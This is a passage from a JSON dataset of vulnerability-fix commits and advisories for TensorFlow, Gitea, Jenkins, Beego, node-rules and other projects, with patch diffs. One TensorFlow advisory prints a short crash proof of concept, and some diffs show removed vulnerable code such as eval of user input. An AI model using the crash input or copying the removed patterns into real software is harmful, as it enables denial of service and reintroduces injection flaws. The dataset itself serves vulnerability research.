360.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/429f009d2b2c09028647dd4bb7b3f6f414bbaad7","commit_sha":"429f009d2b2c09028647dd4bb7b3f6f414bbaad7","patch":"MULTI","chain_ord":"['9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad', '429f009d2b2c09028647dd4bb7b3f6f414bbaad7']","before_first_fix_commit":"{'4f8db85aa9ab71a71e95d5acce7de52a0b195661'}","last_fix_commit":"429f009d2b2c09028647dd4bb7b3f6f414bbaad7","chain_ord_pos":2.0,"commit_datetime":"07\/28\/2021, 20:25:18","message":"Add remaining missing validation to `BoostedTreesCalculateBestFeatureSplit`\n\nPiperOrigin-RevId: 387423006\nChange-Id: I8eaf30efb223011519e60707bfa751b275d3a443","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 19, 'deletions': 1, 'total': 20}","files":"{'tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc': {'additions': 19, 'deletions': 1, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/429f009d2b2c09028647dd4bb7b3f6f414bbaad7\/tensorflow%2Fcore%2Fkernels%2Fboosted_trees%2Fstats_ops.cc', 'patch': '@@ -14,6 +14,7 @@ limitations under the License.\\n ==============================================================================*\/\\n \\n #include <limits>\\n+#include <string>\\n #include <vector>\\n \\n #include \"third_party\/eigen3\/Eigen\/Core\"\\n@@ -22,6 +23,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/tensor_shape.h\"\\n #include \"tensorflow\/core\/kernels\/boosted_trees\/boosted_trees.pb.h\"\\n #include \"tensorflow\/core\/kernels\/boosted_trees\/tree_helper.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #include \"tensorflow\/core\/platform\/logging.h\"\\n \\n namespace tensorflow {\\n@@ -254,12 +256,18 @@ class BoostedTreesCalculateBestFeatureSplitOp : public OpKernel {\\n     \/\/ node_id_range\\n     const Tensor* node_id_range_t;\\n     OP_REQUIRES_OK(context, context->input(\"node_id_range\", &node_id_range_t));\\n+    OP_REQUIRES(\\n+        context, node_id_range_t->NumElements() == 2,\\n+        errors::InvalidArgument(\"node_id_range argument must have shape [2]\"));\\n     const auto node_id_range = node_id_range_t->vec<int32>();\\n     const int32_t node_id_first = node_id_range(0);  \/\/ inclusive\\n     const int32_t node_id_last = node_id_range(1);   \/\/ exclusive\\n \\n     const Tensor* stats_summary_t;\\n     OP_REQUIRES_OK(context, context->input(\"stats_summary\", &stats_summary_t));\\n+    OP_REQUIRES(\\n+        context, stats_summary_t->shape().dims() == 4,\\n+        errors::InvalidArgument(\"stats_summary argument must have rank 4\"));\\n     TTypes<float, 4>::ConstTensor stats_summary =\\n         stats_summary_t->tensor<float, 4>();\\n     const int32_t feature_dims = stats_summary_t->dim_size(1);\\n@@ -272,6 +280,8 @@ class BoostedTreesCalculateBestFeatureSplitOp : public OpKernel {\\n \\n     const Tensor* l1_t;\\n     OP_REQUIRES_OK(context, context->input(\"l1\", &l1_t));\\n+    OP_REQUIRES(context, l1_t->NumElements() == 1,\\n+                errors::InvalidArgument(\"l1 argument must be a scalar\"));\\n     const auto l1 = l1_t->scalar<float>()();\\n     DCHECK_GE(l1, 0);\\n     if (logits_dim_ > 1) {\\n@@ -281,17 +291,25 @@ class BoostedTreesCalculateBestFeatureSplitOp : public OpKernel {\\n \\n     const Tensor* l2_t;\\n     OP_REQUIRES_OK(context, context->input(\"l2\", &l2_t));\\n+    OP_REQUIRES(context, l2_t->NumElements() == 1,\\n+                errors::InvalidArgument(\"l2 argument must be a scalar\"));\\n     const auto l2 = l2_t->scalar<float>()();\\n     DCHECK_GE(l2, 0);\\n \\n     const Tensor* tree_complexity_t;\\n     OP_REQUIRES_OK(context,\\n                    context->input(\"tree_complexity\", &tree_complexity_t));\\n+    OP_REQUIRES(\\n+        context, tree_complexity_t->NumElements() == 1,\\n+        errors::InvalidArgument(\"tree_complexity argument must be a scalar\"));\\n     const auto tree_complexity = tree_complexity_t->scalar<float>()();\\n \\n     const Tensor* min_node_weight_t;\\n     OP_REQUIRES_OK(context,\\n                    context->input(\"min_node_weight\", &min_node_weight_t));\\n+    OP_REQUIRES(\\n+        context, min_node_weight_t->NumElements() == 1,\\n+        errors::InvalidArgument(\"min_node_weight argument must be a scalar\"));\\n     const auto min_node_weight = min_node_weight_t->scalar<float>()();\\n \\n     std::vector<int32> output_node_ids;\\n@@ -300,7 +318,7 @@ class BoostedTreesCalculateBestFeatureSplitOp : public OpKernel {\\n     std::vector<int32> output_thresholds;\\n     std::vector<Eigen::VectorXf> output_left_node_contribs;\\n     std::vector<Eigen::VectorXf> output_right_node_contribs;\\n-    std::vector<string> output_split_types;\\n+    std::vector<std::string> output_split_types;\\n \\n     \/\/ TODO(tanzheny) parallelize the computation.\\n     \/\/ Iterate each node and find the best gain per node.'}}","message_norm":"add remaining missing validation to `boostedtreescalculatebestfeaturesplit`\n\npiperorigin-revid: 387423006\nchange-id: i8eaf30efb223011519e60707bfa751b275d3a443","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('387423006', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/boosted_trees\/stats_ops.cc'])","num_files":1.0},{"index":1671,"vuln_id":"GHSA-f5fj-7265-jxhj","cwe_id":"{'CWE-200'}","score":5.3,"chain":"{'https:\/\/github.com\/go-gitea\/gitea\/commit\/194a11eb110cd98fc2ba52861abf7770db6885a3'}","dataset":"osv","summary":"Information Exposure Gitea version prior to version 1.5.1 contains a CWE-200 vulnerability that can result in Exposure of users private email addresses. This attack appear to be exploitable via Watch a repository to receive email notifications. Emails received contain the other recipients even if they have the email set as private. This vulnerability appears to have been fixed in 1.5.1.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/go-gitea\/gitea","commit_href":"https:\/\/github.com\/go-gitea\/gitea\/commit\/194a11eb110cd98fc2ba52861abf7770db6885a3","commit_sha":"194a11eb110cd98fc2ba52861abf7770db6885a3","patch":"SINGLE","chain_ord":"['194a11eb110cd98fc2ba52861abf7770db6885a3']","before_first_fix_commit":"{'912953e82a851492c7fd1f2e9c10d3a1955b625c'}","last_fix_commit":"194a11eb110cd98fc2ba52861abf7770db6885a3","chain_ord_pos":1.0,"commit_datetime":"08\/24\/2018, 04:41:26","message":"Don't disclose emails of all users when sending out emails (#4664)","author":"techknowlogick","comments":null,"stats":"{'additions': 10, 'deletions': 2, 'total': 12}","files":"{'models\/issue_mail.go': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/go-gitea\/gitea\/raw\/194a11eb110cd98fc2ba52861abf7770db6885a3\/models%2Fissue_mail.go', 'patch': '@@ -1,4 +1,5 @@\\n \/\/ Copyright 2016 The Gogs Authors. All rights reserved.\\n+\/\/ Copyright 2018 The Gitea Authors. All rights reserved.\\n \/\/ Use of this source code is governed by a MIT-style\\n \/\/ license that can be found in the LICENSE file.\\n \\n@@ -87,7 +88,9 @@ func mailIssueCommentToParticipants(e Engine, issue *Issue, doer *User, content\\n \\t\\tnames = append(names, participants[i].Name)\\n \\t}\\n \\n-\\tSendIssueCommentMail(issue, doer, content, comment, tos)\\n+\\tfor _, to := range tos {\\n+\\t\\tSendIssueCommentMail(issue, doer, content, comment, []string{to})\\n+\\t}\\n \\n \\t\/\/ Mail mentioned people and exclude watchers.\\n \\tnames = append(names, doer.Name)\\n@@ -99,7 +102,12 @@ func mailIssueCommentToParticipants(e Engine, issue *Issue, doer *User, content\\n \\n \\t\\ttos = append(tos, mentions[i])\\n \\t}\\n-\\tSendIssueMentionMail(issue, doer, content, comment, getUserEmailsByNames(e, tos))\\n+\\n+\\temails := getUserEmailsByNames(e, tos)\\n+\\n+\\tfor _, to := range emails {\\n+\\t\\tSendIssueMentionMail(issue, doer, content, comment, []string{to})\\n+\\t}\\n \\n \\treturn nil\\n }'}}","message_norm":"don't disclose emails of all users when sending out emails (#4664)","language":"en","entities":"[('disclose', 'SECWORD', ''), ('#4664', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['models\/issue_mail.go'])","num_files":1.0},{"index":1675,"vuln_id":"GHSA-f655-xhvm-cwp4","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/jenkinsci\/gitlab-plugin\/commit\/24e9a99d8151b5345109ef12cddc1ab323baa4ee'}","dataset":"osv","summary":"Cross-site Scripting in Jenkins GitLab Plugin Jenkins GitLab Plugin 1.5.34 and earlier does not escape multiple fields inserted into the description of webhook-triggered builds, resulting in a stored cross-site scripting (XSS) vulnerability exploitable by attackers with Item\/Configure permission.","published_date":"2022-07-01","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/gitlab-plugin","commit_href":"https:\/\/github.com\/jenkinsci\/gitlab-plugin\/commit\/24e9a99d8151b5345109ef12cddc1ab323baa4ee","commit_sha":"24e9a99d8151b5345109ef12cddc1ab323baa4ee","patch":"SINGLE","chain_ord":"['24e9a99d8151b5345109ef12cddc1ab323baa4ee']","before_first_fix_commit":"{'316f8aa1190c646e0cddf6614e3d881d1490be7f'}","last_fix_commit":"24e9a99d8151b5345109ef12cddc1ab323baa4ee","chain_ord_pos":1.0,"commit_datetime":"06\/29\/2022, 15:15:16","message":"[SECURITY-2316]","author":"Daniel Beck","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'src\/main\/resources\/com\/dabsquared\/gitlabjenkins\/cause\/GitLabWebHookCause\/description.jelly': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/gitlab-plugin\/raw\/24e9a99d8151b5345109ef12cddc1ab323baa4ee\/src%2Fmain%2Fresources%2Fcom%2Fdabsquared%2Fgitlabjenkins%2Fcause%2FGitLabWebHookCause%2Fdescription.jelly', 'patch': '@@ -1,4 +1,5 @@\\n <?jelly escape-by-default=\\'true\\'?>\\n <j:jelly xmlns:j=\"jelly:core\">\\n-  <span><j:out value=\"${it.shortDescription}\" \/><\/span>\\n+  <!-- SECURITY-2316: This used to show the HTML-formatted it.shortDescription, but that does not properly neutralize user-provided input -->\\n+  <span>Triggered by GitLab Webhook<\/span>\\n <\/j:jelly>'}}","message_norm":"[security-2316]","language":"en","entities":"[('security-2316', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/resources\/com\/dabsquared\/gitlabjenkins\/cause\/GitLabWebHookCause\/description.jelly'])","num_files":1.0},{"index":1676,"vuln_id":"GHSA-f6g6-54hm-fhxv","cwe_id":"{'CWE-362', 'CWE-119'}","score":8.1,"chain":"{'https:\/\/github.com\/mvertescher\/libsbc-rs\/commit\/a34d6e10f6f5654ed01a35288cf683d014ebc9c4'}","dataset":"osv","summary":"Data races in libsbc Affected versions of this crate implements `Send` for `Decoder<R>` for any `R: Read`. This allows `Decoder<R>` to contain `R: !Send` and carry (move) it to another thread.\n\nThis can result in undefined behavior such as memory corruption from data race on `R`, or dropping `R = MutexGuard<_>` from a thread that didn't lock the mutex.\n\nThe flaw was corrected in commit a34d6e1 by adding trait bound `R: Send` to the `Send` impl for `Decoder<R>`.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/mvertescher\/libsbc-rs","commit_href":"https:\/\/github.com\/mvertescher\/libsbc-rs\/commit\/a34d6e10f6f5654ed01a35288cf683d014ebc9c4","commit_sha":"a34d6e10f6f5654ed01a35288cf683d014ebc9c4","patch":"SINGLE","chain_ord":"['a34d6e10f6f5654ed01a35288cf683d014ebc9c4']","before_first_fix_commit":"{'7278b23901f93d956d9739fdfc4ced147cc3f242'}","last_fix_commit":"a34d6e10f6f5654ed01a35288cf683d014ebc9c4","chain_ord_pos":1.0,"commit_datetime":"01\/23\/2021, 02:06:34","message":"Add R: Send bound to Send impl of Decoder<R>\nfixes issue #4","author":"JOE1994","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/lib.rs': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mvertescher\/libsbc-rs\/raw\/a34d6e10f6f5654ed01a35288cf683d014ebc9c4\/src%2Flib.rs', 'patch': '@@ -33,7 +33,7 @@ where\\n \\n unsafe impl<R> Send for Decoder<R>\\n where\\n-        R: Read,\\n+        R: Read + Send,\\n {\\n }'}}","message_norm":"add r: send bound to send impl of decoder<r>\nfixes issue #4","language":"en","entities":"[('add', 'ACTION', ''), ('decoder', 'SECWORD', ''), ('#4', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":1677,"vuln_id":"GHSA-f6px-w8rh-7r89","cwe_id":"{'CWE-362', 'CWE-732'}","score":4.7,"chain":"{'https:\/\/github.com\/beego\/beego\/pull\/3975\/commits\/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd'}","dataset":"osv","summary":"Data race in Beego The File Session Manager in Beego 1.10.0 allows local users to read session files because there is a race condition involving file creation within a directory with weak permissions.","published_date":"2021-08-02","chain_len":1,"project":"https:\/\/github.com\/beego\/beego","commit_href":"https:\/\/github.com\/beego\/beego\/pull\/3975\/commits\/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd","commit_sha":"f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd","patch":"SINGLE","chain_ord":"['f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd']","before_first_fix_commit":"{'8f3d1c5f42fce57e83e1c3f7d180477595db7cca'}","last_fix_commit":"f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2020, 15:42:54","message":"Change permission mask","author":"Nico Waisman","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'session\/sess_file.go': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/beego\/beego\/raw\/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd\/session%2Fsess_file.go', 'patch': '@@ -138,7 +138,7 @@ func (fp *FileProvider) SessionRead(sid string) (Store, error) {\\n \\tfilepder.lock.Lock()\\n \\tdefer filepder.lock.Unlock()\\n \\n-\\terr := os.MkdirAll(path.Join(fp.savePath, string(sid[0]), string(sid[1])), 0777)\\n+\\terr := os.MkdirAll(path.Join(fp.savePath, string(sid[0]), string(sid[1])), 0755)\\n \\tif err != nil {\\n \\t\\tSLogger.Println(err.Error())\\n \\t}\\n@@ -231,7 +231,7 @@ func (fp *FileProvider) SessionRegenerate(oldsid, sid string) (Store, error) {\\n \\t\\treturn nil, fmt.Errorf(\"newsid %s exist\", newSidFile)\\n \\t}\\n \\n-\\terr = os.MkdirAll(newPath, 0777)\\n+\\terr = os.MkdirAll(newPath, 0755)\\n \\tif err != nil {\\n \\t\\tSLogger.Println(err.Error())\\n \\t}'}}","message_norm":"change permission mask","language":"en","entities":"[('change', 'ACTION', ''), ('permission', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['session\/sess_file.go'])","num_files":1.0},{"index":1679,"vuln_id":"GHSA-f78f-353m-cf4j","cwe_id":"{'CWE-94'}","score":9.8,"chain":"{'https:\/\/github.com\/mithunsatheesh\/node-rules\/commit\/100862223904bb6478fcc33b701c7dee11f7b832'}","dataset":"osv","summary":"Code Injection in node-rules node-rules including 3.0.0 and prior to 5.0.0 allows injection of arbitrary commands. The argument rules of function \"fromJSON()\" can be controlled by users without any sanitization.","published_date":"2021-12-10","chain_len":1,"project":"https:\/\/github.com\/mithunsatheesh\/node-rules","commit_href":"https:\/\/github.com\/mithunsatheesh\/node-rules\/commit\/100862223904bb6478fcc33b701c7dee11f7b832","commit_sha":"100862223904bb6478fcc33b701c7dee11f7b832","patch":"SINGLE","chain_ord":"['100862223904bb6478fcc33b701c7dee11f7b832']","before_first_fix_commit":"{'1b07c48336ce30aa6d3b6b3be1850cd292860dbb'}","last_fix_commit":"100862223904bb6478fcc33b701c7dee11f7b832","chain_ord_pos":1.0,"commit_datetime":"03\/16\/2020, 13:43:37","message":"Remove fromJSON and toJSON from exposed APIs\n\nRemove fromJSON and toJSON from exposed APIs in V5.0.0","author":"Mithun Satheesh","comments":null,"stats":"{'additions': 0, 'deletions': 31, 'total': 31}","files":"{'lib\/node-rules.js': {'additions': 0, 'deletions': 31, 'changes': 31, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mithunsatheesh\/node-rules\/raw\/100862223904bb6478fcc33b701c7dee11f7b832\/lib%2Fnode-rules.js', 'patch': '@@ -128,36 +128,5 @@\\n         }\\n         this.sync();\\n     }\\n-    RuleEngine.prototype.toJSON = function() {\\n-        var rules = this.rules;\\n-        if (rules instanceof Array) {\\n-            rules = rules.map(function(rule) {\\n-                rule.condition = rule.condition.toString();\\n-                rule.consequence = rule.consequence.toString();\\n-                return rule;\\n-            });\\n-        } else if (typeof(rules) != \"undefined\") {\\n-            rules.condition = rules.condition.toString();\\n-            rules.consequence = rules.consequence.toString();\\n-        }\\n-        return rules;\\n-    };\\n-    RuleEngine.prototype.fromJSON = function(rules) {\\n-        this.init();\\n-        if (typeof(rules) == \"string\") {\\n-            rules = JSON.parse(rules);\\n-        }\\n-        if (rules instanceof Array) {\\n-            rules = rules.map(function(rule) {\\n-                rule.condition = eval(\"(\" + rule.condition + \")\");\\n-                rule.consequence = eval(\"(\" + rule.consequence + \")\");\\n-                return rule;\\n-            });\\n-        } else if (rules !== null && typeof(rules) == \"object\") {\\n-            rules.condition = eval(\"(\" + rules.condition + \")\");\\n-            rules.consequence = eval(\"(\" + rules.consequence + \")\");\\n-        }\\n-        this.register(rules);\\n-    };\\n     module.exports = RuleEngine;\\n }(module.exports));'}}","message_norm":"remove fromjson and tojson from exposed apis\n\nremove fromjson and tojson from exposed apis in v5.0.0","language":"en","entities":"[('remove', 'ACTION', ''), ('exposed apis', 'SECWORD', ''), ('exposed apis', 'SECWORD', ''), ('v5.0.0', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/node-rules.js'])","num_files":1.0},{"index":1680,"vuln_id":"GHSA-f78g-q7r4-9wcv","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/548b5eaf23685d86f722233d8fbc21d0a4aecb96'}","dataset":"osv","summary":"Division by 0 in `FractionalAvgPool` ### Impact\nAn attacker can cause a runtime division by zero error and denial of service in `tf.raw_ops.FractionalAvgPool`:\n\n```python\nimport tensorflow as tf\n\nvalue = tf.constant([60], shape=[1, 1, 1, 1], dtype=tf.int32)\npooling_ratio = [1.0, 1.0000014345305555, 1.0, 1.0]\npseudo_random = False\noverlapping = False\ndeterministic = False\nseed = 0\nseed2 = 0\n\ntf.raw_ops.FractionalAvgPool(\n  value=value, pooling_ratio=pooling_ratio, pseudo_random=pseudo_random,\n  overlapping=overlapping, deterministic=deterministic, seed=seed, seed2=seed2)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c\/tensorflow\/core\/kernels\/fractional_avg_pool_op.cc#L85-L89) computes a divisor quantity by dividing two user controlled values:\n\n```cc                     \nfor (int i = 0; i < tensor_in_and_out_dims; ++i) {\n  output_size[i] = static_cast<int>(std::floor(input_size[i] \/ pooling_ratio_[i]));\n  DCHECK_GT(output_size[i], 0); \n} \n``` \n    \nThe user controls the values of `input_size[i]` and `pooling_ratio_[i]` (via the `value.shape()` and `pooling_ratio` arguments). If the value in `input_size[i]` is smaller than the `pooling_ratio_[i]`, then the floor operation results in `output_size[i]` being 0. The `DCHECK_GT` line is a no-op outside of debug mode, so in released versions of TF this does not trigger.\n\nLater, these computed values [are used as arguments](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c\/tensorflow\/core\/kernels\/fractional_avg_pool_op.cc#L96-L99) to [`GeneratePoolingSequence`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/acc8ee69f5f46f92a3f1f11230f49c6ac266f10c\/tensorflow\/core\/kernels\/fractional_pool_common.cc#L100-L108). There, the first computation is a division in a modulo operation:\n\n```cc\nstd::vector<int64> GeneratePoolingSequence(int input_length, int output_length,\n                                           GuardedPhiloxRandom* generator,\n                                           bool pseudo_random) {\n  ...\n  if (input_length % output_length == 0) {\n    diff = std::vector<int64>(output_length, input_length \/ output_length);\n  }\n  ...\n}\n```\n\nSince `output_length` can be 0, this results in runtime crashing.\n\n### Patches\nWe have patched the issue in GitHub commit [548b5eaf23685d86f722233d8fbc21d0a4aecb96](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/548b5eaf23685d86f722233d8fbc21d0a4aecb96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/548b5eaf23685d86f722233d8fbc21d0a4aecb96","commit_sha":"548b5eaf23685d86f722233d8fbc21d0a4aecb96","patch":"SINGLE","chain_ord":"['548b5eaf23685d86f722233d8fbc21d0a4aecb96']","before_first_fix_commit":"{'acc8ee69f5f46f92a3f1f11230f49c6ac266f10c'}","last_fix_commit":"548b5eaf23685d86f722233d8fbc21d0a4aecb96","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2021, 15:38:16","message":"Fix divide by zero error in `fractional_pool_common.cc`.\n\nPiperOrigin-RevId: 371126221\nChange-Id: Iea4b2f363aaeb116ab460e3bc592c687484af344","author":"Laura Pak","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/fractional_avg_pool_op.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/548b5eaf23685d86f722233d8fbc21d0a4aecb96\/tensorflow%2Fcore%2Fkernels%2Ffractional_avg_pool_op.cc', 'patch': '@@ -80,6 +80,10 @@ class FractionalAvgPoolOp : public OpKernel {\\n     std::vector<int> output_size(tensor_in_and_out_dims);\\n     for (int i = 0; i < tensor_in_and_out_dims; ++i) {\\n       input_size[i] = tensor_in.dim_size(i);\\n+      OP_REQUIRES(\\n+          context, pooling_ratio_[i] <= input_size[i],\\n+          errors::InvalidArgument(\\n+              \"Pooling ratio cannot be bigger than input tensor dim size.\"));\\n     }\\n     \/\/ Output size.\\n     for (int i = 0; i < tensor_in_and_out_dims; ++i) {'}}","message_norm":"fix divide by zero error in `fractional_pool_common.cc`.\n\npiperorigin-revid: 371126221\nchange-id: iea4b2f363aaeb116ab460e3bc592c687484af344","language":"en","entities":"[('fix', 'ACTION', ''), ('divide by zero', 'SECWORD', ''), ('error', 'FLAW', ''), ('371126221', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fractional_avg_pool_op.cc'])","num_files":1.0},{"index":1682,"vuln_id":"GHSA-f7f4-hqp2-7prc","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/balderdashy\/sails-hook-sockets\/commit\/ff02114eaec090ee51db48435cc32d451662606e', 'https:\/\/github.com\/balderdashy\/sails-hook-sockets\/commit\/0533a4864b1920fd8fbb5287bc0889193c5faf44'}","dataset":"osv","summary":"Improper Input Validation in sails-hook-sockets Sails.js before v1.0.0-46 allows attackers to cause a denial of service with a single request because there is no error handler in sails-hook-sockets to handle an empty pathname in a WebSocket request.","published_date":"2020-07-24","chain_len":2,"project":"https:\/\/github.com\/balderdashy\/sails-hook-sockets","commit_href":"https:\/\/github.com\/balderdashy\/sails-hook-sockets\/commit\/ff02114eaec090ee51db48435cc32d451662606e","commit_sha":"ff02114eaec090ee51db48435cc32d451662606e","patch":"MULTI","chain_ord":"['ff02114eaec090ee51db48435cc32d451662606e', '0533a4864b1920fd8fbb5287bc0889193c5faf44']","before_first_fix_commit":"{'4f78b7946f7a7ac4c762936d7633298606c1e4a7'}","last_fix_commit":"0533a4864b1920fd8fbb5287bc0889193c5faf44","chain_ord_pos":1.0,"commit_datetime":"09\/23\/2018, 21:18:38","message":"Define req.path for socket requests.","author":"Mike McNeil","comments":"{'com_1': {'author': 'mikermcneil', 'datetime': '10\/01\/2018, 15:34:06', 'body': 'Thanks Ali!'}}","stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'lib\/receive-incoming-sails-io-msg.js': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/balderdashy\/sails-hook-sockets\/raw\/ff02114eaec090ee51db48435cc32d451662606e\/lib%2Freceive-incoming-sails-io-msg.js', 'patch': \"@@ -3,6 +3,7 @@\\n  *\/\\n \\n var util = require('util');\\n+var url = require('url');\\n var _ = require('@sailshq\/lodash');\\n var semver = require('semver');\\n var parseSdkMetadata = require('.\/parse-sdk-metadata');\\n@@ -105,6 +106,8 @@ module.exports = function ToReceiveIncomingSailsIOMsg(app) {\\n \\n       url     : options.incomingSailsIOMsg.url,\\n \\n+      path    : url.parse(options.incomingSailsIOMsg.url).pathname,\\n+\\n       method  : options.eventName,\\n \\n       \/\/ Attached data becomes simulated HTTP body (`req.body`)\"}}","message_norm":"define req.path for socket requests.","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/receive-incoming-sails-io-msg.js'])","num_files":1.0},{"index":1683,"vuln_id":"GHSA-f7f4-hqp2-7prc","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/balderdashy\/sails-hook-sockets\/commit\/ff02114eaec090ee51db48435cc32d451662606e', 'https:\/\/github.com\/balderdashy\/sails-hook-sockets\/commit\/0533a4864b1920fd8fbb5287bc0889193c5faf44'}","dataset":"osv","summary":"Improper Input Validation in sails-hook-sockets Sails.js before v1.0.0-46 allows attackers to cause a denial of service with a single request because there is no error handler in sails-hook-sockets to handle an empty pathname in a WebSocket request.","published_date":"2020-07-24","chain_len":2,"project":"https:\/\/github.com\/balderdashy\/sails-hook-sockets","commit_href":"https:\/\/github.com\/balderdashy\/sails-hook-sockets\/commit\/0533a4864b1920fd8fbb5287bc0889193c5faf44","commit_sha":"0533a4864b1920fd8fbb5287bc0889193c5faf44","patch":"MULTI","chain_ord":"['ff02114eaec090ee51db48435cc32d451662606e', '0533a4864b1920fd8fbb5287bc0889193c5faf44']","before_first_fix_commit":"{'4f78b7946f7a7ac4c762936d7633298606c1e4a7'}","last_fix_commit":"0533a4864b1920fd8fbb5287bc0889193c5faf44","chain_ord_pos":2.0,"commit_datetime":"09\/23\/2018, 21:38:55","message":"Follow up to ff02114eaec090ee51db48435cc32d451662606e to ensure req.path is good and stringy.","author":"Mike McNeil","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'lib\/receive-incoming-sails-io-msg.js': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/balderdashy\/sails-hook-sockets\/raw\/0533a4864b1920fd8fbb5287bc0889193c5faf44\/lib%2Freceive-incoming-sails-io-msg.js', 'patch': \"@@ -106,7 +106,10 @@ module.exports = function ToReceiveIncomingSailsIOMsg(app) {\\n \\n       url     : options.incomingSailsIOMsg.url,\\n \\n-      path    : url.parse(options.incomingSailsIOMsg.url).pathname,\\n+      path    : url.parse(options.incomingSailsIOMsg.url).pathname || '\/',\\n+      \/\/ ^^ Uses || '\/' because otherwise url.parse returns `null`,\\n+      \/\/ which is not a string and thus bad when you try to check\\n+      \/\/ .match() of it.\\n \\n       method  : options.eventName,\"}}","message_norm":"follow up to ff02114eaec090ee51db48435cc32d451662606e to ensure req.path is good and stringy.","language":"en","entities":"[('ff02114eaec090ee51db48435cc32d451662606e', 'SHA', 'generic_sha'), ('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/receive-incoming-sails-io-msg.js'])","num_files":1.0},{"index":1684,"vuln_id":"GHSA-f7f6-xrwc-9c57","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/ea981a029cb985b71f3a0dc0f9ce3b3e3e6c001b'}","dataset":"osv","summary":"Improper Input Validation in Jenkins Jenkins 2.73.1 and earlier, 2.83 and earlier bundled a version of the commons-fileupload library with the denial-of-service vulnerability known as CVE-2016-3092. The fix for that vulnerability has been backported to the version of the library bundled with 